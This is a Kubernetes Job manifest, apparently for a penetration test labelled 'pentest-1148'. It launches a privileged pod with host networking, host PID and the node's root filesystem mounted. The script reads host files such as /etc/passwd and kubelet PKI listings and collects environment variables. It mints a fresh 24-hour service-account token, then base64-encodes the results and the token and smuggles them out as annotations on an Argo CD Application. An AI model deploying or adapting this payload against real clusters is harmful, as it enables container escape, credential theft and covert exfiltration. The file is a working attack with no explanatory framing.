apiVersion: batch/v1
kind: Job
metadata:
  name: probe
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      hostNetwork: true
      hostPID: true
      containers:
      - name: c
        image: curlimages/curl:8.10.1
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
        command: ["/bin/sh","-c"]
        args:
        - |
          API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          OUT=/tmp/out.txt
          {
            echo "## id"; id
            echo "## hostname"; hostname
            echo "## uname"; uname -a
            echo "## ns"; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
            echo "## env"; env | sort
            echo "## host-root"; ls -la /host 2>&1 | head -40
            echo "## host-hostname"; cat /host/etc/hostname 2>&1
            echo "## host-passwd"; head -5 /host/etc/passwd 2>&1
            echo "## host-kube-manifests"; ls /host/etc/kubernetes/manifests 2>&1 | head
            echo "## node-sa-dir"; ls /host/var/lib/kubelet/pki 2>&1 | head
          } > $OUT 2>&1
          TR=$(curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$API/api/v1/namespaces/pentest-1148/serviceaccounts/probe/token" -d '{"spec":{"expirationSeconds":86400}}')
          echo "## TokenRequest" >> $OUT
          echo "$TR" >> $OUT
          NEWTOK=$(printf '%s' "$TR" | sed -n 's/.*"token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
          echo "NEWTOK_LEN=${#NEWTOK}" >> $OUT
          B64=$(base64 $OUT | tr -d '\n')
          TB64=$(printf '%s' "$NEWTOK" | base64 | tr -d '\n')
          PATCH="{\"metadata\":{\"annotations\":{\"pentest1148.out\":\"$B64\",\"pentest1148.token\":\"$TB64\"}}}"
          echo "PATCHING"
          curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/merge-patch+json" -X PATCH "$API/apis/argoproj.io/v1alpha1/namespaces/argocd/applications/p1148" -d "$PATCH"
          echo DONE
      volumes:
      - name: hostroot
        hostPath:
          path: /
